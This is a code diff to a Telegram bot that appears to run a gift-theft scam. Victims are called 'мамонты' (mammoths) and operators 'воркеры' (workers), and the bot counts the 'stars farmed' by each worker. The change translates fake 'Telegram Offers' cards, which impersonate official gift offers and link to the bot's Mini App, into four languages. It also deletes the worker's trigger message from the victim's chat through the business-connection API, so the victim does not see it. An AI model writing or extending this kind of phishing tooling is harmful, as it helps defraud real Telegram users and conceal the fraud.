@@ -20,6 +20,7 @@ from aiogram.types import (
     WebAppInfo, BotCommand, BotCommandScopeDefault,
 )
 from aiogram.exceptions import TelegramBadRequest
+from aiogram.methods import DeleteBusinessMessages
 from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
@@ -103,8 +104,75 @@ post_lock = asyncio.Lock()
 
 waiting_tasks: dict = {}
 
+# ═══════════════════════════════════════════════════════
+#   ЯЗЫКИ ОФФЕРОВ
+# ═══════════════════════════════════════════════════════
+
+LANGS = {
+    "ru": "🇷🇺 Русский",
+    "uk": "🇺🇦 Українська",
+    "en": "🇬🇧 English",
+    "ar": "🇸🇦 العربية",
+}
+
+DEFAULT_LANG = "ru"
+
+TEXTS = {
+    "ru": {
+        "offer_title": "⚖️ <b>Telegram Offers</b>",
+        "offer_body": "👤 User <a href='https://t.me/{uname}'>{uname}</a> предлагает вам <b>{price}</b> ⭐ за подарок <b>{gift}</b>",
+        "offer_valid": "Оффер действителен <b>{time}</b>.",
+        "accept": "✅ Принять",
+        "reject": "❌ Отклонить",
+        "lang_pick": "🌐 <b>Язык офферов</b>\n\nВыбери язык, на котором будут приходить твои офферы:",
+        "lang_set": "✅ Язык установлен: <b>{name}</b>",
+        "lang_current": "Текущий: <b>{name}</b>",
+    },
+    "uk": {
+        "offer_title": "⚖️ <b>Telegram Offers</b>",
+        "offer_body": "👤 User <a href='https://t.me/{uname}'>{uname}</a> пропонує вам <b>{price}</b> ⭐ за подарунок <b>{gift}</b>",
+        "offer_valid": "Оффер дійсний <b>{time}</b>.",
+        "accept": "✅ Прийняти",
+        "reject": "❌ Відхилити",
+        "lang_pick": "🌐 <b>Мова офферів</b>\n\nОбери мову, якою будуть приходити твої оффери:",
+        "lang_set": "✅ Мову встановлено: <b>{name}</b>",
+        "lang_current": "Поточна: <b>{name}</b>",
+    },
+    "en": {
+        "offer_title": "⚖️ <b>Telegram Offers</b>",
+        "offer_body": "👤 User <a href='https://t.me/{uname}'>{uname}</a> offers you <b>{price}</b> ⭐ for the gift <b>{gift}</b>",
+        "offer_valid": "Offer valid for <b>{time}</b>.",
+        "accept": "✅ Accept",
+        "reject": "❌ Decline",
+        "lang_pick": "🌐 <b>Offer language</b>\n\nChoose the language for your incoming offers:",
+        "lang_set": "✅ Language set: <b>{name}</b>",
+        "lang_current": "Current: <b>{name}</b>",
+    },
+    "ar": {
+        "offer_title": "⚖️ <b>عروض تيليجرام</b>",
+        "offer_body": "👤 المستخدم <a href='https://t.me/{uname}'>{uname}</a> يعرض عليك <b>{price}</b> ⭐ مقابل الهدية <b>{gift}</b>",
+        "offer_valid": "العرض صالح لمدة <b>{time}</b>.",
+        "accept": "✅ قبول",
+        "reject": "❌ رفض",
+        "lang_pick": "🌐 <b>لغة العروض</b>\n\nاختر اللغة التي ستأتيك بها عروضك:",
+        "lang_set": "✅ تم تعيين اللغة: <b>{name}</b>",
+        "lang_current": "الحالية: <b>{name}</b>",
+    },
+}
+
+
+def t(lang, key, **kwargs):
+    """Перевод. Fallback на ru."""
+    lang = lang if lang in TEXTS else DEFAULT_LANG
+    template = TEXTS[lang].get(key) or TEXTS[DEFAULT_LANG].get(key, "")
+    try:
+        return template.format(**kwargs)
+    except Exception:
+        return template
+
+
 print("=" * 60)
-print(f"BOT v15.2 — debug .test handler")
+print(f"BOT v16 — multilingual offers + working delete")
 print(f"BOT_USERNAME: {BOT_USERNAME}")
 print(f"POSTS: {len(PARSED_POSTS)}")
 for p in PARSED_POSTS:
@@ -132,7 +200,7 @@ class User(Base):
     balance: Mapped[int] = mapped_column(Integer, default=0)
     total_offers: Mapped[int] = mapped_column(Integer, default=0)
     stars_farmed: Mapped[int] = mapped_column(Integer, default=0)
-    lang: Mapped[str] = mapped_column(String(8), default="ru")
+    lang: Mapped[str] = mapped_column(String(8), default=DEFAULT_LANG)
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
@@ -157,7 +225,7 @@ class Offer(Base):
     duration_hours: Mapped[int] = mapped_column(Integer, default=24)
     status: Mapped[str] = mapped_column(String(16), default="pending")
     stars_earned: Mapped[int] = mapped_column(Integer, default=0)
-    lang: Mapped[str] = mapped_column(String(8), default="ru")
+    lang: Mapped[str] = mapped_column(String(8), default=DEFAULT_LANG)
     created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)
 
 
@@ -245,7 +313,7 @@ async def add_user(user_id, username=None, first_name=None, role="user"):
         u = await s.get(User, user_id)
         if u:
             return u
-        u = User(id=user_id, username=username, first_name=first_name, role=role)
+        u = User(id=user_id, username=username, first_name=first_name, role=role, lang=DEFAULT_LANG)
         s.add(u)
         await s.commit()
         await s.refresh(u)
@@ -258,6 +326,20 @@ async def set_role(user_id, role):
         if u:
             u.role = role
             await s.commit()
+
+
+async def set_lang(user_id, lang):
+    async with SessionLocal() as s:
+        u = await s.get(User, user_id)
+        if u:
+            u.lang = lang
+            await s.commit()
+
+
+async def get_lang(user_id):
+    async with SessionLocal() as s:
+        u = await s.get(User, user_id)
+        return u.lang if u and u.lang else DEFAULT_LANG
 
 
 async def add_stars_farmed(user_id, amount):
@@ -293,13 +375,13 @@ async def get_business_conn(user_id):
 
 
 async def create_offer(worker_id, worker_username, gift_name, gift_link,
-                       price_stars, price_usd, target_user_id=None, duration_hours=24):
+                       price_stars, price_usd, target_user_id=None, duration_hours=24, lang=DEFAULT_LANG):
     async with SessionLocal() as s:
         o = Offer(worker_id=worker_id, worker_username=worker_username,
                   target_user_id=target_user_id,
                   gift_name=gift_name, gift_link=gift_link,
                   price_stars=price_stars, price_usd=price_usd,
-                  duration_hours=duration_hours)
+                  duration_hours=duration_hours, lang=lang)
         s.add(o)
         u = await s.get(User, worker_id)
         if u:
@@ -597,6 +679,7 @@ def worker_menu():
         [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
         [InlineKeyboardButton(text="👥 Мои мамонты", callback_data="my_mammoths")],
         [InlineKeyboardButton(text="🔌 Моё подключение", callback_data="my_conn")],
+        [InlineKeyboardButton(text="🌐 Язык офферов", callback_data="lang_menu")],
         [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
     ])
 
@@ -608,6 +691,7 @@ def admin_menu():
         [InlineKeyboardButton(text="👥 Мои мамонты", callback_data="my_mammoths")],
         [InlineKeyboardButton(text="👥 Все воркеры", callback_data="admin_workers")],
         [InlineKeyboardButton(text="🔌 Моё подключение", callback_data="my_conn")],
+        [InlineKeyboardButton(text="🌐 Язык офферов", callback_data="lang_menu")],
         [InlineKeyboardButton(text="📊 Логи", callback_data="admin_logs")],
         [InlineKeyboardButton(text="💎 Сессии", callback_data="admin_sessions")],
         [InlineKeyboardButton(text="📈 Статистика", callback_data="admin_stats")],
@@ -620,6 +704,15 @@ def menu_for(role):
     if role == "admin": return admin_menu()
     if role == "worker": return worker_menu()
     return InlineKeyboardMarkup(inline_keyboard=[])
+
+
+def lang_menu_kb(current=DEFAULT_LANG):
+    rows = []
+    for code, name in LANGS.items():
+        mark = "✅ " if code == current else ""
+        rows.append([InlineKeyboardButton(text=f"{mark}{name}", callback_data=f"setlang:{code}")])
+    rows.append([InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
 
 
 class OfferForm(StatesGroup):
@@ -675,6 +768,8 @@ def parse_dot_offer(text):
 
 
 def make_offer_card(o, duration=24):
+    """Карточка оффера. Язык берётся из o.lang (язык воркера)."""
+    lang = getattr(o, "lang", DEFAULT_LANG) or DEFAULT_LANG
     expires_at = o.created_at + timedelta(hours=duration)
     now = datetime.utcnow()
     if expires_at > now:
@@ -685,20 +780,18 @@ def make_offer_card(o, duration=24):
     else:
         time_left = "expired"
     uname = o.worker_username or "support"
-    return (
-        f"⚖️ <b>Telegram Offers</b>\n\n"
-        f"👤 User <a href='https://t.me/{uname}'>{uname}</a> "
-        f"offers you <b>{o.price_stars}</b> ⭐ for the gift <b>{o.gift_name}</b>\n\n"
-        f"Offer valid for <b>{time_left}</b>."
-    )
+    title = t(lang, "offer_title")
+    body = t(lang, "offer_body", uname=uname, price=o.price_stars, gift=o.gift_name)
+    valid = t(lang, "offer_valid", time=time_left)
+    return f"{title}\n\n{body}\n\n{valid}"
 
 
-def make_offer_kb(offer_id):
+def make_offer_kb(offer_id, lang=DEFAULT_LANG):
     accept = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_accept"
     reject = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_reject"
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="✅ Принять", url=accept)],
-        [InlineKeyboardButton(text="❌ Отклонить", url=reject)],
+        [InlineKeyboardButton(text=t(lang, "accept"), url=accept)],
+        [InlineKeyboardButton(text=t(lang, "reject"), url=reject)],
     ])
 
 
@@ -723,40 +816,10 @@ async def on_business_connection(conn: types.BusinessConnection):
         print(f"business_connection error: {e}")
 
 
-# ─── DEBUG .test ───
-@dp.business_message(F.text == ".test")
-async def debug_test_handler(message: types.Message):
-    """Временный хендлер: пишет в личку правильные chat_id и msg_id."""
-    uid = message.from_user.id
-    chat_id = message.chat.id
-    msg_id = message.message_id
-    biz = getattr(message, "business_connection_id", None)
-
-    print(f"[DEBUG] from={uid} chat_id={chat_id} msg_id={msg_id} biz={biz}", flush=True)
-
-    conn = await get_business_conn(uid)
-    is_worker = conn is not None and conn.connection_id is not None
-
-    text = (
-        f"🔍 <b>DEBUG .test</b>\n\n"
-        f"👤 from_user_id: <code>{uid}</code>\n"
-        f"💬 chat_id: <code>{chat_id}</code>\n"
-        f"📨 message_id: <code>{msg_id}</code>\n"
-        f"🔌 biz_conn: <code>{biz or '—'}</code>\n\n"
-        f"conn из БД: <code>{conn.connection_id if conn else '—'}</code>\n"
-        f"ты воркер: <b>{'да' if is_worker else 'нет'}</b>"
-    )
-
-    try:
-        await bot.send_message(8986358602, text)
-    except Exception as e:
-        print(f"[DEBUG] send failed: {e}", flush=True)
-
-
-# ─── ТОЧКА — СОЗДАНИЕ ОФФЕРА ───
+# ─── ТОЧКА — СОЗДАНИЕ ОФФЕРА + УДАЛЕНИЕ ───
 @dp.business_message(F.text.startswith("."))
 async def business_offer_dot(message: types.Message):
-    """Воркер отправил .ссылка цена → отправляем карточку."""
+    """Воркер отправил .ссылка цена → удаляем сообщение → отправляем карточку."""
     uid = message.from_user.id
     u = await get_user(uid)
     if not u or u.role not in ("worker", "admin"):
@@ -776,14 +839,20 @@ async def business_offer_dot(message: types.Message):
         await bot.send_message(uid, f"❌ Нет бизнес-подключения. → @{BOT_USERNAME}")
         return
 
-    # пробуем удалить сообщение (не сработает, но оставим для полноты)
+    # ── удаляем сообщение с точкой через DeleteBusinessMessages ──
     deleted = False
     try:
-        await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
+        await bot(DeleteBusinessMessages(
+            business_connection_id=conn.connection_id,
+            message_ids=[message.message_id],
+        ))
         deleted = True
-        print(f"[DOT] deleted via bot api, msg_id={message.message_id}")
+        print(f"[DOT] deleted via DeleteBusinessMessages, msg_id={message.message_id}")
     except Exception as e:
         print(f"[DOT] delete failed: {type(e).__name__}: {e}")
+
+    # ── язык воркера ──
+    worker_lang = u.lang or DEFAULT_LANG
 
     # ── создаём оффер ──
     price_usd = f"{price_stars * 0.0092:.2f}"
@@ -791,7 +860,7 @@ async def business_offer_dot(message: types.Message):
         worker_id=uid, worker_username=message.from_user.username,
         gift_name=gift_name, gift_link=gift_link,
         price_stars=price_stars, price_usd=price_usd,
-        target_user_id=chat_id, duration_hours=24,
+        target_user_id=chat_id, duration_hours=24, lang=worker_lang,
     )
 
     sent = False
@@ -799,7 +868,7 @@ async def business_offer_dot(message: types.Message):
         await bot.send_message(
             chat_id=chat_id,
             text=make_offer_card(o),
-            reply_markup=make_offer_kb(o.id),
+            reply_markup=make_offer_kb(o.id, lang=worker_lang),
             business_connection_id=conn.connection_id,
             disable_web_page_preview=True,
         )
@@ -808,7 +877,7 @@ async def business_offer_dot(message: types.Message):
         await bot.send_message(uid, f"❌ Ошибка отправки: {e}")
 
     await add_log(worker_id=uid, offer_id=o.id, event="dot_offer",
-                  detail=f"{gift_name} → {chat_id} за {price_stars}⭐ sent={sent} deleted={deleted}")
+                  detail=f"{gift_name} → {chat_id} за {price_stars}⭐ lang={worker_lang} sent={sent} deleted={deleted}")
 
     try:
         await bot.send_message(ADMIN_ID,
@@ -816,7 +885,8 @@ async def business_offer_dot(message: types.Message):
             f"Воркер: <code>{uid}</code>\n"
             f"Мамонт: <code>{chat_id}</code>\n"
             f"Подарок: {gift_name}\nЦена: {price_stars}⭐\n"
-            f"ID: <code>{o.id}</code>")
+            f"Язык: <b>{worker_lang}</b>\n"
+            f"Удалено: {'✅' if deleted else '❌'}\nID: <code>{o.id}</code>")
     except Exception:
         pass
 
@@ -842,6 +912,7 @@ async def start(message: types.Message):
         f"👤 <b>Профиль</b>\n"
         f"├ ID: <code>{uid}</code>\n"
         f"├ Роль: <b>{u.role}</b>{conn_line}\n"
+        f"├ Язык: <b>{LANGS.get(u.lang or DEFAULT_LANG, u.lang)}</b>\n"
         f"└ Завёл звёзд: <b>{u.stars_farmed} ⭐</b>",
         reply_markup=menu_for(u.role),
     )
@@ -859,6 +930,7 @@ async def main_menu(call: types.CallbackQuery):
         f"👤 <b>Профиль</b>\n"
         f"├ ID: <code>{u.id}</code>\n"
         f"├ Роль: <b>{u.role}</b>{conn_line}\n"
+        f"├ Язык: <b>{LANGS.get(u.lang or DEFAULT_LANG, u.lang)}</b>\n"
         f"└ Завёл звёзд: <b>{u.stars_farmed} ⭐</b>",
         reply_markup=menu_for(u.role),
     )
@@ -877,11 +949,43 @@ async def profile(call: types.CallbackQuery):
         f"├ Роль: <b>{u.role}</b>\n"
         f"├ Бизнес: <b>{'✅' if conn and conn.connection_id else '❌'}</b>\n"
         f"├ Офферов: <b>{u.total_offers}</b>\n"
+        f"├ Язык: <b>{LANGS.get(u.lang or DEFAULT_LANG, u.lang)}</b>\n"
         f"└ Завёл: <b>{u.stars_farmed} ⭐</b>",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
         ]),
     )
+
+
+# ─── ЯЗЫК ───
+@dp.callback_query(F.data == "lang_menu")
+async def lang_menu(call: types.CallbackQuery):
+    u = await get_user(call.from_user.id)
+    if not u or u.role not in ("admin", "worker"):
+        return
+    current = u.lang or DEFAULT_LANG
+    text = t(current, "lang_pick") + f"\n\n{t(current, 'lang_current', name=LANGS.get(current, current))}"
+    await call.message.edit_text(text, reply_markup=lang_menu_kb(current))
+
+
+@dp.callback_query(F.data.startswith("setlang:"))
+async def set_lang_callback(call: types.CallbackQuery):
+    u = await get_user(call.from_user.id)
+    if not u or u.role not in ("admin", "worker"):
+        return
+    new_lang = call.data.split(":")[1]
+    if new_lang not in LANGS:
+        await call.answer("❌ Неверный язык", show_alert=True)
+        return
+    await set_lang(u.id, new_lang)
+    name = LANGS[new_lang]
+    await call.answer(t(new_lang, "lang_set", name=name).replace("<b>", "").replace("</b>", ""), show_alert=False)
+    current = new_lang
+    text = t(current, "lang_pick") + f"\n\n{t(current, 'lang_current', name=LANGS.get(current, current))}"
+    try:
+        await call.message.edit_text(text, reply_markup=lang_menu_kb(current))
+    except Exception:
+        pass
 
 
 @dp.callback_query(F.data == "admin_posts")
@@ -1098,16 +1202,18 @@ async def cmd_offer(message: types.Message):
     if not conn or not conn.connection_id:
         await message.answer(f"❌ Бизнес-бот не подключён. → @{BOT_USERNAME}"); return
     price_usd = f"{price_stars * 0.0092:.2f}"
+    worker_lang = u.lang or DEFAULT_LANG
     o = await create_offer(worker_id=uid, worker_username=message.from_user.username,
                             gift_name=gift_name, gift_link=gift_link,
                             price_stars=price_stars, price_usd=price_usd,
-                            target_user_id=target_user_id, duration_hours=24)
+                            target_user_id=target_user_id, duration_hours=24,
+                            lang=worker_lang)
     sent = False
     try:
         await bot.send_message(
             chat_id=target_user_id,
             text=make_offer_card(o),
-            reply_markup=make_offer_kb(o.id),
+            reply_markup=make_offer_kb(o.id, lang=worker_lang),
             business_connection_id=conn.connection_id,
             disable_web_page_preview=True,
         )
@@ -1116,18 +1222,18 @@ async def cmd_offer(message: types.Message):
         err = str(e).lower()
         if "never contacted" in err or "not enough rights" in err or "peer_id_invalid" in err or "business_peer_usage_missing" in err:
             await message.answer("⚠️ Мамонт не писал вам. Перешлите:")
-            await message.answer(make_offer_card(o), reply_markup=make_offer_kb(o.id),
+            await message.answer(make_offer_card(o), reply_markup=make_offer_kb(o.id, lang=worker_lang),
                                   disable_web_page_preview=True)
         else:
             await message.answer(f"❌ {e}")
     if sent:
         await message.answer(f"✅ Отправлено <code>{target_user_id}</code>")
     await add_log(worker_id=uid, offer_id=o.id, event="offer_sent",
-                  detail=f"{gift_name} → {target_user_id}")
+                  detail=f"{gift_name} → {target_user_id} lang={worker_lang}")
     try:
         await bot.send_message(ADMIN_ID,
             f"🆕 <b>Оффер #{o.id}</b>\nВоркер: <code>{uid}</code>\nЦель: <code>{target_user_id}</code>\n"
-            f"Подарок: {gift_name}\nЦена: {price_stars}⭐")
+            f"Подарок: {gift_name}\nЦена: {price_stars}⭐\nЯзык: <b>{worker_lang}</b>")
     except Exception: pass
 
 
@@ -1159,16 +1265,19 @@ async def offer_link(message: types.Message, state: FSMContext):
 async def offer_price(message: types.Message, state: FSMContext):
     if not message.text.isdigit():
         await message.answer("❌ Число."); return
+    u = await get_user(message.from_user.id)
+    worker_lang = (u.lang if u else None) or DEFAULT_LANG
     data = await state.get_data()
     price_stars = int(message.text)
     price_usd = f"{price_stars * 0.0092:.2f}"
     o = await create_offer(worker_id=message.from_user.id,
                             worker_username=message.from_user.username,
                             gift_name=data["gift_name"], gift_link=data["gift_link"],
-                            price_stars=price_stars, price_usd=price_usd, duration_hours=24)
+                            price_stars=price_stars, price_usd=price_usd,
+                            duration_hours=24, lang=worker_lang)
     await state.clear()
     await message.answer("✅ <b>Оффер создан</b>\n\nПерешлите:\n\n" + make_offer_card(o),
-                          reply_markup=make_offer_kb(o.id),
+                          reply_markup=make_offer_kb(o.id, lang=worker_lang),
                           disable_web_page_preview=True)
 
 
@@ -1194,7 +1303,7 @@ async def my_offers(call: types.CallbackQuery):
 async def workers_menu(call: types.CallbackQuery):
     if call.from_user.id != ADMIN_ID: return
     workers = await get_workers()
-    lines = [f"🔧 <code>{w.id}</code> — @{w.username or '—'} — {w.total_offers} оф. — {w.stars_farmed}⭐"
+    lines = [f"🔧 <code>{w.id}</code> — @{w.username or '—'} — {w.total_offers} оф. — {w.stars_farmed}⭐ — {w.lang or DEFAULT_LANG}"
              for w in workers]
     await call.message.edit_text(
         "👥 <b>Воркеры</b>\n\n" + ("\n".join(lines) if lines else "<i>Пусто</i>"),
@@ -1289,7 +1398,7 @@ async def admin_stats(call: types.CallbackQuery):
     lines = ["📈 <b>Статистика</b>\n"]; total = 0
     for w in workers:
         total += w.stars_farmed
-        lines.append(f"🔧 @{w.username or '—'}\n   <code>{w.id}</code>\n   Оф: {w.total_offers} | ⭐ {w.stars_farmed}\n")
+        lines.append(f"🔧 @{w.username or '—'}\n   <code>{w.id}</code>\n   Оф: {w.total_offers} | ⭐ {w.stars_farmed} | {w.lang or DEFAULT_LANG}\n")
     lines.append(f"\n💰 <b>ИТОГО: {total} ⭐</b>")
     await call.message.edit_text("\n".join(lines),
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
@@ -1763,7 +1872,7 @@ async def health():
 
 async def run_bot():
     print("=" * 60)
-    print("BOOT v15.2")
+    print("BOOT v16")
     print("=" * 60)
     await init_db()
     print("RUN_BOT: db ready")
